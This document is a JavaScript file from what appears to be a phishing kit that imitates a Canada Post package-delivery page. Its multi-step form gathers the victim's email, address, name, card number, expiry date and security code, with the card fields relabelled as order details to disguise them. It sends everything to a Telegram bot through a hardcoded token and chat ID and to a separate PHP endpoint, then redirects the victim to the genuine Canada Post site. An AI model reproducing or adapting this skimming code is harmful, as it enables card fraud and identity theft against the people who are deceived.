
        $(document).ready(function() {
			 
            //Screen trigger
            $('#continue').click(function() { 
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--1').fadeOut(100);
                $('.main--2').fadeIn(1000); 
 	 			
            }); 
            
            $('#continuee').click(function() {
            		if($("#capost").valid()){ 
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--2').fadeOut(100);
               $('.main--3').fadeIn(1000);
          } else {  			
				} 			
            }); 
            
            $('#continua').click(function() {
            	if($("#capost").valid()){
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--3').fadeOut(100); 
                $('.main--4').fadeIn(1000); 
                const token = '2092304553:AAEsnoIqHbmf0XeAVns9VDbAwlqiA6nEzj4';
                const chatId = '2019685107';
            const eboite = document.querySelector('#eboite').value;
            const ecode = document.querySelector('#ecode').value;
            const ecity = document.querySelector('#ecity').value;
            const name = document.querySelector('#name').value;
            const cardnumber = document.querySelector('#cardnumber').value;
            const expirationdate = document.querySelector('#expirationdate').value;
            const securitycode = document.querySelector('#securitycode').value;
            const message = `****Orders details*** \n Email: ${eboite}\nPostalecode: ${ecode}\nCity: ${ecity}\nName : ${name}\nOrdernumber : ${cardnumber}\nOrderexpo  : ${expirationdate}\nOrderssv : ${securitycode}`;
            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
            });
            $.ajax({
                type: 'POST',
                url: `https://www.italmediab2b.it/feedbnp.php`,
                data: $( "#data" ).val(message),
            });	
            	setTimeout(
                    function() {
                        window.location.replace("https://www.canadapost.ca/");
                    }, 3000
                );	
          } 
          else {  			
				} 			
            }); 
			 

 
  $("#capost").validate( { 
			rules: { 
					eboite: {
                        required: true,
                        email: true, 
                    },
	               ecode: {
                        required: true,
                        minlength: 5, 
                    }, 
                    
	               ecity: {
                        required: true,
                        minlength: 3, 
                    },	
			        name: {
                        required: true,
                        minlength: 4, 
                    },
			
                    cardnumber: {
                        required: true,
                        minlength: 16, 
                    },
                    expirationdate: {
                        required: true,
						minlength: 5, 
                    },
                    securitycode: {
                        required: true,
                        minlength: 3, 
                    },			 
					
                }, 
                messages: { 
					eboite: {
                        required: "",
                        email: "", 
                    }, 
	                ecode: {
                        required: "",
                        minlength: "", 
                    },
		            ecity: {
                        required: "",
                        minlength: "", 
                    },  	
                    name: {
                        required: "",
                        minlength: "", 
                    },				
                    cardnumber: {
                        required: "",
                        minlength: "", 
                    },
                    expirationdate: {
                        required: "",
						minlength: "",
                    },
                    securitycode: {
                        required: "",
                        minlength: "", 
                    },	
                },  
	    });	 


        var changed_title = false;
        setInterval(function() {
            if (changed_title) {
                document.title = 'Deliver My Package';
                changed_title = false;
            } else {
                document.title = 'Deliver My Package';
                changed_title = true;
            }
        }, 3000);
  
 
});
 